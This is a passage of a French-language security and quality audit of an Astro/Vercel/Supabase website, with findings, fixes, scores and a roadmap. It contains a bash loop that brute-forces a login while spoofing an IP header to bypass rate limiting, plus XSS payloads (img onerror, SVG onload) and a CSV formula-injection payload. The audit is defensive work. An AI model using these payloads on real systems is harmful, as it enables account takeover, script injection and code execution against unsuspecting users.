nonce="zsP9agPmSxxQHYHSI1dlVbQ6"     # ← UN SEUL nonce, figé, identique sur toutes les pages
```

**Deux faits :**

1. Le middleware Astro s'exécute **au build** pour les 49 pages `prerender = true`. Le nonce généré à ce moment est **gravé dans le HTML statique**, identique pour tous les visiteurs, à vie.
2. Ces pages sont servies **directement par le CDN Vercel**. Le middleware ne s'exécute pas → **aucun header `Content-Security-Policy` n'est émis.**

Et `vercel.json` ne définit **aucun** CSP.

**Résultat.** `/`, `/blog/*`, `/faq`, `/piliers/*`, `/legal/*` — tout le site public — n'a **aucun CSP**. Le nonce est du décor.

**Correction.** Définir le CSP dans `vercel.json` pour les routes statiques (sans nonce, avec des hashes), et garder un CSP dynamique nonce-based uniquement sur les routes SSR.
```json
{
  "source": "/((?!api|dashboard|auth).*)",
  "headers": [{
    "key": "Content-Security-Policy",
    "value": "default-src 'self'; script-src 'self' 'sha256-...'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'"
  }]
}
```

---

## 🔴 CRITIQUE 4 — Rate-limit contournable par un header HTTP

**Fichier :** `src/lib/http.ts:13-22`
**OWASP :** A07:2021 — Identification and Authentication Failures

```ts
const cf = headers.get('cf-connecting-ip');      // ← priorité 1, fourni par le CLIENT
const realIp = headers.get('x-real-ip');
const forwarded = headers.get('x-forwarded-for')?.split(',')[0]?.trim();
const ip = cf ?? realIp ?? forwarded ?? fromAstro ?? 'unknown';
```

Le site tourne sur **Vercel**, pas derrière Cloudflare. Vercel ne strippe pas `cf-connecting-ip`. C'est un header **entièrement contrôlé par l'attaquant**, et il a la priorité la plus haute.

**Exploit — bypass total du rate-limit de connexion (5/min) :**
```bash
for i in $(seq 1 100000); do
  curl -s https://biscuits-ia.com/auth/connexion \
    -H "cf-connecting-ip: 1.2.3.$((RANDOM % 255))" \
    -d "email=victim@x.fr&password=guess$i"
done
```
→ Credential stuffing / brute force illimité. Le compteur `Map` voit 100 000 clés distinctes.

**Correction.**
```ts
export function getClientIpOrNull(request: Request, clientAddress?: string | null): string | null {
  // Sur Vercel, SEUL x-vercel-forwarded-for est écrit par la plateforme
  // et ne peut pas être spoofé par le client.
  const vercel = request.headers.get('x-vercel-forwarded-for');
  if (vercel) return vercel.split(',')[0]!.trim();
  return clientAddress?.trim() || null;
  // Ne JAMAIS lire cf-connecting-ip / x-real-ip / x-forwarded-for sans proxy de confiance.
}
```

---

## 🔴 CRITIQUE 5 — Le rate-limit est en mémoire, sur du serverless

**Fichier :** `src/lib/rateLimit.ts:11`
```ts
const store = new Map<string, RateLimitEntry>();
```

Le commentaire l'admet (« Vercel serverless will reset on cold starts, providing a natural baseline »). Ce n'est pas une baseline : avec N instances Fluid concurrentes, la limite effective est **5 × N** par minute, et un cold start la remet à zéro.

**Combiné avec CRITIQUE 4, le rate-limiting du projet n'existe pas.**

**Correction.** Upstash Redis (`@upstash/ratelimit`, sliding window), ou règles de rate-limiting du **Vercel WAF** — qui s'appliquent *avant* la lambda et coûtent 0 en compute.

---

## 🟠 IMPORTANTE 6 — Fuite mémoire dans le middleware

**Fichier :** `src/middleware.ts:29, 114`
```ts
const logoutCache = new Map<string, LogoutCacheEntry>();
// ...
logoutCache.set(userId, { lastLogoutAtMs: value, expiresAt: Date.now() + LOGOUT_CACHE_TTL_MS });
```

**Aucune suppression, aucun cleanup, aucune borne.** Une entrée par `userId` vu, conservée pour la durée de vie de l'instance (les instances Fluid Compute vivent longtemps). À l'échelle de « millions de visiteurs », l'instance part en OOM.

**Correction.** LRU borné (`lru-cache`, `max: 5000`), ou purge périodique comme dans `rateLimit.ts`.

---

## 🟠 IMPORTANTE 7 — `handleSessionGuard` fail-open

**Fichier :** `src/middleware.ts:154-157`
```ts
} catch (err) {
  console.error('[middleware] handleSessionGuard exception:', err);
  return 'ok'; // Fail-open.
}
```

Si Supabase Auth est indisponible ou lent, toute session — y compris une session invalidée par logout — est considérée valide. Pour un guard de sécurité, le défaut doit être **fail-closed**, ou au minimum ne pas retourner `'ok'` silencieusement.

---

## 🟠 IMPORTANTE 8 — Endpoint public non authentifié faisant des écritures DB en `service_role`

**Fichier :** `src/pages/api/admin/resources/telecharger.ts` (GET, aucune auth)
```ts
await adminDb.rpc('increment_downloads', { row_id: resourceId });          // écriture
await adminDb.from('resource_downloads').insert({ resource_id, user_id }); // écriture
```

Chaque `GET /api/admin/resources/telecharger?id=<uuid>` déclenche **2 écritures DB** avec la clé `service_role`, **sans authentification**. Le rate-limit (CRITIQUE 4-5) ne protège pas.

**Amplification.** 1 requête HTTP → 1 SELECT + 1 RPC + 1 INSERT + 1 signature Storage. Un attaquant sature la DB à faible coût et fait exploser `resource_downloads`.

**Aussi.** Ce fichier est dans `/api/admin/` alors qu'il est public. **Le nommage ment.**

**Correction.** Compteur agrégé asynchrone (queue / `pg_cron`), rate-limit distribué, et déplacer la route hors de `/api/admin/`.

---

## 🟠 IMPORTANTE 9 — Upload : `image/svg+xml` autorisé, MIME non vérifié

**Fichier :** `src/pages/api/admin/resources/upload.ts:11`
```ts
'image/png', 'image/jpeg', 'image/gif', 'image/webp', 'image/svg+xml',
```
```ts
if (!ALLOWED_MIME_TYPES.has(file.type)) { ... }   // file.type = déclaré par le CLIENT
```

1. **SVG est un vecteur XSS actif** (`<svg onload=...>`, `<script>` inline).
2. `file.type` provient du `FormData` du navigateur. **Aucun sniffing de magic bytes.** Un attaquant envoie du HTML avec `type: "application/pdf"`.
3. Le fichier est servi via une signed URL Supabase Storage (`*.supabase.co`) — cross-origin, ce qui limite l'impact aujourd'hui. Mais si vous branchez un jour un domaine custom sur le bucket, c'est une XSS same-origin immédiate.

**Correction.** Retirer `image/svg+xml`. Valider par magic bytes (`file-type`). Forcer `Content-Disposition: attachment` + `Content-Type: application/octet-stream` côté Storage.

---

## 🟠 IMPORTANTE 10 — XSS stockée dans les notifications du dashboard

**Fichier :** `src/layouts/DashboardLayout.astro:337-350`
```js
const text = n.type === 'assignment'
  ? `Vous avez été assigné à "${n.payload?.task_title ?? 'une tâche'}"`   // ← NON échappé
  : ...;
return `<li ... data-task-id="${n.payload?.task_id ?? ''}"                // ← NON échappé
  <div class="notif-item-text">${text}</div>`;
```

`task_title` est saisi par un bénévole (`POST /api/benevole/tasks`). Un titre `<img src=x onerror=…>` s'exécute dans le navigateur de l'admin assigné.

Le reste du projet utilise correctement `esc()` (`project/[id].astro:732`). **Ce fichier est le seul qui l'oublie.** Le CSP `script-src-attr 'none'` mitige — mais CRITIQUE 3 montre que ce CSP n'est pas fiable.

---

## 🟡 MOYENNE 11 — Injection de formule CSV

**Fichier :** `src/lib/adherentsApi.ts:333-337`
```ts
export function toCsvCell(value: string | null | undefined): string {
  const raw = String(value ?? '');
  if (!/[",\n]/.test(raw)) return raw;
  return `"${raw.replaceAll('"', '""')}"`;
}
```

Aucun échappement de `=`, `+`, `-`, `@`, `\t`, `\r`. Un adhérent dont le `nom` vaut `=cmd|'/c calc'!A1` exécute du code sur la machine du trésorier qui ouvre l'export dans Excel.

**Correction.**
```ts
const FORMULA = /^[=+\-@\t\r]/;
export function toCsvCell(v?: string | null): string {
  let raw = String(v ?? '');
  if (FORMULA.test(raw)) raw = `'${raw}`;
  return /["\,\n\r]/.test(raw) ? `"${raw.replaceAll('"','""')}"` : raw;
}
```

---

## 🟡 MOYENNE 12 — Comparaison de secret non constante en temps

**Fichiers :** `src/pages/api/cron/email-outbox.ts:37`, `src/pages/api/appointments/cron/expire.ts:26`
```ts
if (authHeader !== `Bearer ${expectedSecret}`) { ... }
```
`!==` sur des chaînes court-circuite au premier octet différent. Utiliser `crypto.timingSafeEqual` — comme le fait, correctement, `src/lib/helloasso.ts:280`.

---

## 🟡 MOYENNE 13 — Injection HTML dans les emails

**Fichier :** `src/pages/api/formations/helloasso/webhook.ts` (helper `sendRefundEmailToUser`)
```ts
html: `<p>Bonjour ${profile.full_name ?? ''},</p> ... <strong>${training.title}</strong>`
```
`full_name` est fourni par l'utilisateur. Injecté sans échappement dans un email HTML envoyé aux **admins**.

---

## 🟡 MOYENNE 14 — CSRF : protection implicite uniquement

Aucun token CSRF, aucun contrôle d'`Origin` / `Sec-Fetch-Site` dans les 82 routes API. La seule protection est `sameSite: 'lax'` (`src/lib/supabase.ts:96`), qui bloque effectivement les POST cross-site.

**Mais** `lax` envoie le cookie sur les **navigations GET de premier niveau**. Toute route `GET` qui mute est CSRF-able. `telecharger.ts` en est une (IMPORTANTE 8).

**Correction.**
```ts
// src/middleware.ts
const site = context.request.headers.get('sec-fetch-site');
if (!['GET','HEAD','OPTIONS'].includes(context.request.method)
    && site && site !== 'same-origin') {
  return new Response('CSRF', { status: 403 });
}
```

---

## 🟡 MOYENNE 15 — `.env` a été commité 6 fois

```
a244cf8  ENV prod by optimized
ebc32fe  refacto
9ffab9e  update formulaire web3form
e2d3eb3  update legal page
ef05744  update
48bbe96  update            ← suppression
```

**Bonne nouvelle, vérifiée.** Ces commits ne contiennent **que** des `PUBLIC_*` et deux clés `PUBLIC_WEB3FORMS_*`. **Aucune `SUPABASE_SERVICE_ROLE_KEY`, aucun secret SMTP, aucun `CRON_SECRET`.** Le `.gitignore` couvre désormais `.env*`.

**Action quand même.** Faire tourner les clés Web3Forms, et ajouter un scanner de secrets (gitleaks) en pre-commit.

---

## 🟢 Ce qui est solide

- **Vérification HMAC HelloAsso** : `timingSafeEqual` + validation de format + **fail-closed** si non configuré (`helloasso.ts:269-282`). Correct.
- **Cookies** : `httpOnly`, `secure` en prod, `sameSite: 'lax'`, `path: '/'`. Correct.
- **Le raisonnement `getUser()` only / `skipAutoInitialize` / pas de `signOut()` serveur** (`supabase.ts:1-30`) : **excellent**, et rare.
- **Idempotence webhook** via `payload_hash` unique.
- **Validation UUID** systématique avant les `.eq('id', …)`.
- **RLS activée** dans 14 migrations sur 27.
- **Aucun secret dans `dist/`** — vérifié : `grep -r 'service_role\|eyJ...' dist/` → vide.

---

# 8. ASTRO / REACT — **5/10**

| Gravité | Constat |
|---|---|
| 🔴 | `<CookieConsent client:visible />` dans le layout **global** → React (185 Ko) hydraté sur 129 pages statiques. Aucune n'a besoin de React. |
| 🟠 | `client:load` sur `ContactForm`, `Recruitmentform`, `AdminAppointmentsDashboard` → hydratation bloquante. `client:visible` ou `client:idle` suffirait dans les 3 cas. |
| 🟠 | Le middleware bufferise la réponse (`await response.text()`) → **streaming HTML désactivé** sur toutes les routes SSR. |
| 🟠 | `@astrojs/node` **et** `@astrojs/vercel` installés. Adaptateurs concurrents. `@astrojs/node` : 0 usage. |
| 🟠 | `/trombinoscope` : `prerender = false` + requête `service_role` à chaque hit + `Cache-Control: no-store` dans `vercel.json`. Une page **publique, en lecture seule**, rendue en SSR non caché. Devrait être ISR (`s-maxage=3600`). |
| 🟡 | `requireAuth()` retourne `AuthResult \| Response`. Chaque appelant doit faire `if (x instanceof Response) return x`. Un oubli = route ouverte. Aucun test ne le vérifie. |
| 🟢 | Islands minimales, SSG par défaut sur le contenu public, `astro:content` pour le blog. **La stratégie de rendu est bonne** — c'est la mise en œuvre qui fuit. |

## Architecture cible proposée

```
Pages publiques    → prerender = true, 0 JS, CSP via vercel.json (headers statiques)
/trombinoscope     → prerender = true + ISR (revalidate 3600) OU s-maxage
Dashboards / API   → SSR, middleware (rate-limit distribué + Sec-Fetch-Site + CSP nonce)
CookieConsent      → <script> vanilla inline, ~2 Ko
Chat / Kanban      → 1 island React ciblée sur /dashboard/benevole/project/[id]
                     (au lieu de 700 lignes de innerHTML impératif)
```

---

# 9. UX — **6/10**

| Gravité | Constat |
|---|---|
| 🔴 | **Vitesse perçue** : 158 Ko de HTML + 94 Ko de CSS inline + 2 familles Google Fonts + 185 Ko de React. Sur 4G/mobile, le FCP est mauvais et le LCP pire. |
| 🟠 | Chat : `container.innerHTML = messages.map(...)` recrée tout le DOM à chaque tick → scroll saccadé, focus perdu, sélection de texte effacée. |
| 🟠 | Admin projects : `setInterval` de polling **sans `clearInterval`** (`admin/projects/[id].astro:356`) → requêtes qui continuent après navigation. La version bénévole utilise Realtime, l'admin non. **Incohérence.** |
| 🟠 | `/logiciels` et `/anti-pepins` : 586 lignes de contenu **inatteignable** (301 en amont). Contenu produit, invisible. |
| 🟡 | Deux pages « politique de confidentialité » (`/legal/confidentialite` et `/legal/politique-de-confidentialite`) — contenu dupliqué, cannibalisation SEO. |
| 🟢 | Design system cohérent (`theme.css`, variables CSS), `prefers-reduced-motion`, skip-link, formulaires avec honeypot + validation client/serveur partagée (`src/lib/validation.ts`). **Bon travail.** |

---

# 10. DÉPENDANCES — **5/10**

## 🟠 Packages inutilisés (0 référence dans `src/`)
- `lucide-astro` (^0.462.0) — `astro-icon` + `@iconify-json/mdi` font déjà le travail
- `@astrojs/node` (11.0.0) — adaptateur concurrent de `@astrojs/vercel`

## 🟠 Mauvais bucket : `dependencies` au lieu de `devDependencies`
`@astrojs/check` · `@astrojs/ts-plugin` · `typescript` · `@types/react` · `@types/react-dom` · `@tailwindcss/vite` · `tailwindcss`

→ Installés en production sur Vercel. Build plus lent, image plus lourde.

## 🟠 `zod` sous-utilisé
Installé, présent dans **5 fichiers sur 82 routes API**. Le webhook de paiement (`webhook.ts:31`) utilise `let payload: any`. C'est exactement l'inverse de ce qu'il faut.

## 🟠 `tailwind.config.mjs` : format v3 avec Tailwind v4
Le fichier n'est jamais lu. Cf. §2.2.

## 🟡 Deux lockfiles
`package-lock.json` + `bun.lock`. Choisissez-en un.

## 🟢 Ce qui est bien
- Aucune CVE évidente. Les `overrides` sur `path-to-regexp ^8` et `yaml ^2.8.3` montrent que **vous avez déjà patché les vulnérabilités connues**. Bien vu.
- `sanitize-html` sur le flux RSS.
- Versions récentes partout (Astro 7, React 19, Tailwind 4).

---

# 11. DEVOPS — **1/10**

```
.github/          → ABSENT
Dockerfile        → ABSENT
docker-compose    → ABSENT
tests             → AUCUN (0 .test.ts, 0 .spec.ts, 0 vitest, 0 playwright)
eslint.config.js  → ABSENT (mais "npm run lint" existe et échoue)
monitoring        → AUCUN (pas de Sentry, pas de log drain configuré)
```

## Ce qui existe
- `vercel.json` (headers + redirects) : correct dans la forme.
- **Logs structurés JSON** dans `src/pages/api/cron/email-outbox.ts:66-78` : bien fait, exploitable par un log drain… qui n'est pas branché.
- `scripts/cron-status.mjs` + `scripts/test-auth-flows.sh` : scripts manuels.
- `astro-error.log` et `logs/preview-err.log` sont **versionnés**. À supprimer.

## Ce qui manque, et qui est non-négociable pour du trafic de masse
1. Une CI qui fait `astro check` + `eslint` + `astro build` sur chaque PR.
2. **Un test qui assert sur `dist/`** : « robots.txt contient `Disallow: /dashboard` », « le nonce n'est pas hardcodé », « `sitemap.xml` n'existe pas ».
3. Sentry (ou Vercel Agent) pour les erreurs runtime.
4. Un scanner de secrets pre-commit.

## CI minimale à créer

```yaml
# .github/workflows/ci.yml
name: CI
on: [push, pull_request]
jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: oven-sh/setup-bun@v2
      - run: bun install --frozen-lockfile
      - run: bunx astro check
      - run: bun run lint
      - run: bun run build

      - name: Assert build invariants
        run: |
          grep -q "Disallow: /dashboard" dist/client/robots.txt \
            || { echo "::error::robots.txt sans Disallow"; exit 1; }
          ! grep -qE 'nonce="[A-Za-z0-9+/=]{20,}"' dist/client/index.html \
            || { echo "::error::nonce hardcodé dans le HTML statique"; exit 1; }
          test ! -f dist/client/sitemap.xml \
            || { echo "::error::sitemap.xml statique masque sitemap-index.xml"; exit 1; }
```

---

# 12. STRUCTURE HTML — **5/10**

| Gravité | Constat |
|---|---|
| 🔴 | Ordre des titres invalide (cf. §4.5) |
| 🟠 | 3 pages sans `<h1>` |
| 🟠 | `<h3>` dans `<nav>` et `<footer>` — mauvais usage sémantique des headings |
| 🟡 | `<main role="main">` : rôle redondant |
| 🟡 | `<meta http-equiv="X-Content-Type-Options">` : sans effet |
| 🟡 | `<noscript>` dupliqué (`BaseHead.astro:104` et `112`) |
| 🟢 | `lang="fr-FR" dir="ltr"`, `<nav aria-label>`, `<main id>`, `<footer>`, `<section aria-labelledby>` — **landmarks présents et corrects** |

---

# 13. CSS — **3/10**

| Gravité | Constat |
|---|---|
| 🔴 | 94 Ko inline / page (§3.1) |
| 🔴 | `@import` Google Fonts dans le CSS inline (§3.2) |
| 🔴 | Tailwind importé 2× → preflight ×3, 170 vars `--tw-*` (§3.3) |
| 🔴 | `dashboard.css` (18 Ko, CSS d'admin) livré sur la page d'accueil publique |
| 🟠 | `tailwind.config.mjs` mort — les couleurs `corps.*` n'existent pas |
| 🟠 | Tailwind pour ~10 utilitaires (`grid`, `flex`, `text-xl`, `mt-1`). **95 % du CSS est écrit à la main.** Le coût dépasse le bénéfice. |
| 🟡 | Règle `aspect-ratio: attr(...)` sans effet |
| 🟢 | `theme.css` (8 Ko) : design tokens propres, variables CSS, dark mode. **La partie « architecture » est bonne.** |

## Décision recommandée

**Supprimer Tailwind.** Vous avez un design system CSS custom cohérent de 62 Ko. Tailwind y ajoute un preflight + un moteur JIT pour ~10 classes. Remplacez `grid` / `flex` / `mt-1` par des classes utilitaires maison (15 lignes de CSS).

*Alternative :* adopter Tailwind pour de vrai et migrer les 62 Ko. Ne restez pas au milieu.

---

# 14. JAVASCRIPT / TYPESCRIPT — **5/10**

| Gravité | Constat |
|---|---|
| 🔴 | `let payload: any` sur un webhook de **paiement** (`webhook.ts:31`) alors que `zod` est installé |
| 🟠 | 27 `any` / `as any` dans 15 fichiers |
| 🟠 | Fuite mémoire `logoutCache` (§7, IMPORTANTE 6) |
| 🟠 | `setInterval` sans `clearInterval` (`admin/projects/[id].astro:356`, `project/[id].astro:1331`) |
| 🟠 | `esc()` (`project/[id].astro:733`) n'échappe pas `'`. Sûr aujourd'hui (attributs en `"`), fragile demain. |
| 🟠 | `catch { /* silent */ }` × ~10 — les erreurs réseau du chat, des commentaires et des notifications disparaissent. L'utilisateur voit une UI vide sans savoir pourquoi. |
| 🟡 | `AuthResult \| Response` : type union piégeux (cf. §8) |
| 🟢 | `tsconfig` étend `astro/tsconfigs/strict`. Unions discriminées bien utilisées (`AdherentAuthResult`, `SchemaData`). Type guards (`isUserRole`, `isValidUUID`). **Le typage, quand il est fait, est de bon niveau.** |

## Correction du webhook

```ts
import { z } from 'zod';

const HelloAssoWebhook = z.object({
  eventType: z.string(),
  data: z.object({
    checkoutIntentId: z.string().optional(),
    amount: z.number().int().nonnegative(),
    state: z.string(),
    currency: z.enum(['EUR', 'USD', 'GBP']).default('EUR'),
    payer: z.object({
      email: z.string().email(),
      firstName: z.string(),
      lastName: z.string().optional(),
    }).optional(),
    metadata: z.object({ registration_id: z.string().uuid() }),
  }),
});

const parsed = HelloAssoWebhook.safeParse(JSON.parse(rawBody));
if (!parsed.success) return new Response('Invalid payload', { status: 400 });
```

---

# 15. API — **4/10**

| Gravité | Constat |
|---|---|
| 🔴 | Rate-limit inopérant (§7, CRITIQUE 4-5) |
| 🔴 | `/api/admin/resources/telecharger` : public, `service_role`, 2 écritures DB par GET |
| 🟠 | 40 routes réimplémentent le guard d'auth à la main (§1.5) → 2× `getUser()` + 2× `SELECT profiles` par requête |
| 🟠 | Aucun schéma de validation d'entrée sur la majorité des routes. `zod` : 5 fichiers sur 82. |
| 🟠 | **Trois conventions d'erreur** : `jsonError()` sur `/api/adherents`, `new Response('Accès interdit')` (texte brut) ailleurs, `redirect('?error=...')` sur les routes formulaire. |
| 🟠 | Pas de header `Retry-After` cohérent, pas de `X-RateLimit-*` |
| 🟡 | `toCsvResponse()` interpole `filename` dans `Content-Disposition` sans échappement — sûr aujourd'hui (constantes), à surveiller |
| 🟢 | `Cache-Control: no-store` sur `/api/*` dans `vercel.json` : correct. |
| 🟢 | Pagination + tri whitelisté (`allowedSortColumns`, `adherents/index.ts:34`) : correct. |
| 🟢 | Audit trail (`logAdherentOperation`) avec IP / UA / path : bon réflexe RGPD. |

---

# 16. BASE DE DONNÉES — **5/10**

| Gravité | Constat |
|---|---|
| 🔴 | Le dossier s'appelle `supabase/migration/` (**singulier**). Le CLI Supabase lit `supabase/migrations/`. **`supabase db push` ignore vos 27 migrations.** Elles sont appliquées à la main. |
| 🟠 | Deux conventions de nommage mélangées : `20260624_add_trainings.sql` (horodaté) et `add_benevoles.sql`, `migration.sql`, `fix_projects_rls_listing.sql` (non ordonnable). **L'ordre d'application n'est pas déterministe.** Impossible de reconstruire la base. |
| 🟠 | `fix_*.sql`, `drop_*.sql`, `restrict_*.sql` : le schéma est un empilement de correctifs, pas un état déclaratif. Pas de `supabase db diff`. |
| 🟠 | **49 tables**, 14 fichiers seulement contenant `ENABLE ROW LEVEL SECURITY`. Il faut auditer table par table. Beaucoup d'accès passent par `service_role` (qui bypasse RLS), ce qui **reporte toute la sécurité sur le code applicatif** — précisément là où sont les bugs (§7). |
| 🟡 | 67 index créés au total. `max_rows = 1000` dans `config.toml` : bon garde-fou. |
| 🟢 | **UPDATE atomique** avec `WHERE status = 'pending' AND expires_at < now()` (`cron/expire.ts:38-43`) au lieu d'un SELECT-then-UPDATE. Race condition correctement évitée. |
| 🟢 | `pg_cron` pour l'outbox email + expiration RDV : bon design (déporte le travail hors de la lambda). |
| 🟢 | Pattern **outbox transactionnel** pour les emails : c'est le bon pattern. |

**Correction immédiate.**
```bash
git mv supabase/migration supabase/migrations
# Puis renommer chaque fichier en <timestamp>_<nom>.sql
```

---

# 17. COMPARAISON AUX STANDARDS

| Standard | Verdict |
|---|---|
| **Google** (Core Web Vitals, HTML/CSS Style Guide) | ❌ 94 Ko CSS inline, 185 Ko React inutile, `h3` avant `h1`, sitemap 404. Échec sur LCP et sur la structure. |
| **Vercel** (Framework best practices) | ❌ `output: 'server'` avec middleware bufferisant (streaming off), rate-limit en mémoire sur du serverless, deux adaptateurs, pas d'ISR sur une page publique SSR. |
| **Cloudflare / OWASP ASVS** | ❌ CSP absent sur le site public, nonce statique, rate-limit spoofable par header, pas de token CSRF, pas de WAF. |
| **Airbnb (JS Style Guide)** | ⚠️ ESLint installé, config absente, script cassé. Nommage inconsistant (FR/EN mélangés : `supprimer.ts` / `delete.ts`, `benevoles/toggle.ts` / `formations/toggle.ts`). |
| **Microsoft (Secure SDL)** | ❌ 0 test, 0 CI, 0 threat model, 0 scanner de dépendances, 0 scanner de secrets. |

---

# 18. AUDIT IA — Comprendre ce projet en tant que LLM — **4/10**

## Ce qui aide un agent IA

- Commentaires d'en-tête **excellents** dans `src/lib/supabase.ts`, `src/middleware.ts`, `src/lib/helloasso.ts`. Ils expliquent le *pourquoi*, pas le *quoi*. C'est rare et précieux.
- `src/env.d.ts` documente les variables d'environnement **et les invariants de sécurité**.
- `MEMORY.md` existe.
- Structure Astro conventionnelle → un LLM la reconnaît immédiatement.

## Ce qui bloque un agent IA

1. **61 fichiers `scripts/patch-*.cjs`** noient tout `grep`. Un agent qui cherche « comment le layout est-il modifié » tombe sur `patch-h15b.cjs`.
2. **Les commentaires mentent** (§2.5, §2.1). Un agent IA fait confiance aux commentaires. Un commentaire qui décrit un kill-switch inexistant produit du code faux.
3. **Le fossé source/build est invisible.** Rien dans le repo ne dit que `public/robots.txt` écrase `astro.config.mjs`. Un agent lit la config et conclut, à tort, que les disallows sont actifs.
4. **Aucun test** → aucune spécification exécutable. Un agent ne peut pas vérifier son travail.
5. **Pas d'`ARCHITECTURE.md`, pas de `CLAUDE.md` / `AGENTS.md`, pas de `CONTRIBUTING.md`.** Le `README.md` fait 4,7 Ko.
6. **1385 lignes dans un `.astro`** dépasse ce qu'un agent peut modifier en sécurité en un seul contexte.

## Fichiers à créer

### `AGENTS.md` (racine — lu par Claude Code, Cursor, Copilot Workspace)

```markdown
# Agents — biscuits-ia

## Invariants NON NÉGOCIABLES
1. Côté serveur : `getUser()` uniquement. Jamais `getSession()`, `signOut()`,
   `refreshSession()`. Cf. src/lib/supabase.ts (token rotation Supabase).
2. `SUPABASE_SERVICE_ROLE_KEY` : jamais dans un `.tsx` ni dans le frontmatter
   d'un composant hydraté.
3. Tout JSON-LD passe par `jsonLd()` (échappe `<`, `>`, `&`). Jamais `JSON.stringify` nu.
4. Toute route `/api/admin/*` utilise `requireAdmin()`. Pas de check inline.
5. Toute injection de HTML côté client passe par `esc()`.

## Pièges connus (le source ment)
- `public/robots.txt` ÉCRASE la config `astro-robots-txt` d'astro.config.mjs.
- `public/sitemap.xml` ÉCRASE la sortie de `@astrojs/sitemap`.
- Le middleware NE S'EXÉCUTE PAS sur les pages `prerender = true`
  → le CSP et le nonce n'existent pas sur le site public.
- `tailwind.config.mjs` n'est JAMAIS lu (Tailwind v4 sans directive `@config`).

## Vérifier avant de dire "c'est fait"
    bun run build && ./scripts/assert-build-invariants.sh
```

### Autres fichiers

| Fichier | Contenu |
|---|---|
| `ARCHITECTURE.md` | Diagramme de flux requête (CDN → middleware → route → Supabase), frontière prerender/SSR, où vit chaque secret, pattern outbox email, cycle de vie de la session. |
| `CONTRIBUTING.md` | Convention de nommage (choisir FR **ou** EN), format des migrations, obligation de test. |
| `CLAUDE.md` | Peut être un simple `@import` d'`AGENTS.md`. |
| `README.md` | Le vôtre décrit le produit. Ajoutez : prérequis, `.env` minimal, commandes, architecture en 5 lignes. |
| `SECURITY.md` | Politique de divulgation, contact. |

---

# 📊 TABLEAU RÉCAPITULATIF

| # | Catégorie | Note /10 |
|---|-----------|----------|
| 1 | Architecture globale | **4** |
| 2 | Qualité du code | **4** |
| 3 | Performance | **3** |
| 4 | SEO | **3** |
| 5 | IA & Robots | **4** |
| 6 | Accessibilité | **5** |
| 7 | Sécurité (OWASP) | **3** |
| 8 | Astro / React | **5** |
| 9 | UX | **6** |
| 10 | Dépendances | **5** |
| 11 | DevOps | **1** |
| 12 | Structure HTML | **5** |
| 13 | CSS | **3** |
| 14 | JS / TypeScript | **5** |
| 15 | API | **4** |
| 16 | Base de données | **5** |
| 17 | Standards industriels | **3** |
| 18 | Compréhension par les IA | **4** |

## 🎯 SCORE GLOBAL : **38 / 100**

### Lecture du score

Ce n'est pas un projet médiocre ; c'est un projet **inégal**.

Le raisonnement sur la session Supabase, la vérification HMAC HelloAsso, l'UPDATE atomique du cron, le pattern outbox, les unions discriminées : ce sont des marques de **compétence réelle**. Ils cohabitent avec un CSP inopérant, un `robots.txt` écrasé, un sitemap 404 et zéro CI.

**Le déficit n'est pas dans la connaissance. Il est dans la vérification.**

Rien dans ce repo ne prouve qu'une intention se traduit en comportement. Ajoutez cette boucle de vérification et le score passe mécaniquement à **65–70 en deux semaines**.

---

# 🗺️ ROADMAP

> **État au 2026-07-09** — 35 items faits sur 43, vérifiés dans le code et non
> d'après les titres de commit. Restent 7 items ouverts + 1 partiel (#28).
> Les items 41 à 43 ne figuraient pas dans l'audit initial : ils ont été
> découverts en cours de route. Les items cochés ont été confirmés sur
> l'artefact (`dist/`, `.vercel/output/`) ou par une assertion dans
> `scripts/assert-build-invariants.mjs` (22 assertions, dont 3 testées en négatif).

## PRIORITÉ 1 — Immédiat (aujourd'hui / cette semaine)

> *Failles exploitables + SEO cassé. Rien d'autre ne compte tant que ce bloc n'est pas fait.*

**Bloc terminé** (commit `7909ad9`), à une réserve près : l'item 1 n'avait été fait
qu'à moitié, ce qui a cassé toutes les routes SSR pendant 24 h. Voir #41.

- [x] **1.** Supprimer `injectNonce()` (`middleware.ts:230`) et passer `nonce={Astro.locals.nonce}` explicitement — ⚠️ *complété seulement par #41*
- [x] **2.** Échapper tous les JSON-LD — fonction `jsonLd()`, 8 sites d'appel
- [x] **3.** Corriger `getClientIpOrNull()` → `x-vercel-forwarded-for` uniquement
- [x] **4.** `git rm public/robots.txt public/sitemap.xml` → vérifier le `dist/` après build
- [x] **5.** Renommer `/a-qui.s-adresse` → `/a-qui-s-adresse` + 301
- [x] **6.** Trancher `/logiciels` et `/anti-pepins` : page **ou** redirect
- [x] **7.** Rate-limit distribué (Upstash) ou règle WAF Vercel sur `/auth/*`
- [x] **8.** CSP dans `vercel.json` pour les routes statiques
- [x] **9.** Échapper `task_title` / `task_id` dans `DashboardLayout.astro:337` — via `textContent`/`dataset`, jamais `innerHTML`
- [x] **10.** Retirer `image/svg+xml` des uploads

## PRIORITÉ 2 — 2 semaines

> *Performance + le filet de sécurité qui empêche la P1 de revenir.*

- [x] **11.** `inlineStylesheets: 'auto'` → −94 Ko / page
- [x] **12.** Retirer `@import` Google Fonts de `global.css` ; self-host les polices (`@fontsource-variable/inter`)
- [x] **13.** Retirer le second `@import "tailwindcss"` de `dashboard.css`
- [x] **14.** Remplacer `CookieConsent` React par du vanilla → −185 Ko de JS
- [x] **15.** Retirer `await response.text()` du middleware → réactiver le streaming
- [x] **16.** **CI GitHub Actions** avec les assertions sur `dist/` — `.github/workflows/ci.yml`
- [x] **17.** `eslint.config.js` (flat config) + faire passer `npm run lint`
- [x] **18.** Borner `logoutCache` (LRU)
- [x] **19.** `timingSafeEqual` sur les secrets de cron
- [ ] **20.** Brancher Sentry — ⛔ **NON FAIT.** Absent de `package.json`. Seul mécanisme
      qui aurait signalé la régression CSP (#41) en production plutôt qu'au hasard d'un audit.

## PRIORITÉ 3 — 1 mois

- [x] **21.** Remplacer les 40 checks d'auth inline par `requireAdmin()` / `requireRole()`
- [x] **22.** `zod` sur les 82 routes API, en commençant par le webhook HelloAsso
- [x] **23.** Corriger l'ordre des titres (`Header` / `Footer`) + ajouter les `<h1>` manquants
- [x] **24.** `git mv supabase/migration supabase/migrations` + horodater les 27 fichiers
- [ ] **25.** Audit RLS table par table (49 tables) — ⛔ **NON FAIT.** 14 migrations activent
      `ENABLE ROW LEVEL SECURITY`, aucun recensement table par table. Nécessite un accès
      à la base de prod : le code contourne massivement RLS via `service_role`, donc
